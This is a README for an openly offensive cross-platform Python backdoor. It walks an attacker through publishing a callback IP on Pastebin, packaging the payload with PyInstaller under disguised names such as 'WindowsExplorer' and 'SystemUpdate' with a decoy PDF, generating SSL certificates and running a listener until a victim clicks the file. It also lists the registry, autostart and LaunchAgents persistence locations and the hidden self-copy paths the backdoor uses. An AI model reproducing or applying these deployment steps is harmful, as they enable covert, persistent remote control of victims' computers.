# ⚠️ | This Backdoor dosen't bypass windows defender and other AV's completely

## Note :
Unobfuscated backdoor will be detected and quarintined by defender

## Requirements for this to work :
### Attacker's side :
1. Python installed with required packages 
2. Pyinstaller installed
3. Update ur current IP address in [Pastebin.com](https://pastebin.com)
4. If target is windows then package it in windows itself

### Victim's side :
1. Dosen't matter if he has python or not
2. Any OS is fine

## Steps to use this backdoor :
1. ### clone this repo :
    ```zsh
   git clone https://github.com/Anonomous69/Backdoor
   ```

   cd to that directory (also dont forget to change the [Pastebin.com](https://pastebin.com) URL)

2. ### find your pyinstaller path and run :
#### For windows :
    ```powershell
    C:\Users\wherever\your\path\is\pyinstaller.exe --onefile --noconsole --name "WindowsExplorer" --icon="icon.ico" --add-data "sample.pdf;." backdoor.py
    ```
  
#### For MacOS :
    ```zsh
    /Users/path/to/pyinstaller --onefile --windowed --name "SystemUpdate" --icon="icon.icns" --add-data "sample.pdf:." backdoor.py
    ```

#### For Linux :
    ```bash
    pyinstaller --onefile --noconsole --name "sysupdate" --icon="icon.png" --add-data "sample.pdf:." backdoor.py
    ```

   If ran successfully the created executable will be in your newly created "Dist" directory

 5. ### Generate cerificates for SSL encryption (Do this in same directory as listener.py) :
    ```bash
    openssl req -new -x509 -days 365 -nodes -out cert.pem -keyout key.pem
    ```

4. ### Run Listener is your machine and send the backdoor to target
   ```zsh
   python listeenr.py
   ```
 when target clicks backdoor, you get the connection
 

# Working of this backdoor 

### 🧷 1. **Persistence Setup**
The backdoor first **adds itself to system startup locations** to maintain persistence:

- **Windows:**  
  `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`

- **Linux:**  
  `~/.config/autostart`

- **macOS:**  
  `~/Library/LaunchAgents`

---

### 🕵️ 2. **Self-Copy for Stealth**
It then **copies itself to a hidden/system-like location** and re-executes from there:

- **Windows:**  
  `%TEMP%\WindowsExplorer.exe`

- **Linux:**  
  `~/.local/.sysupdate`

- **macOS:**  
  `~/Library/Application Support/.sysupdate`

---

### 📰 3. **Distraction Mechanism**
To **distract the victim**, it opens a decoy PDF file after execution.
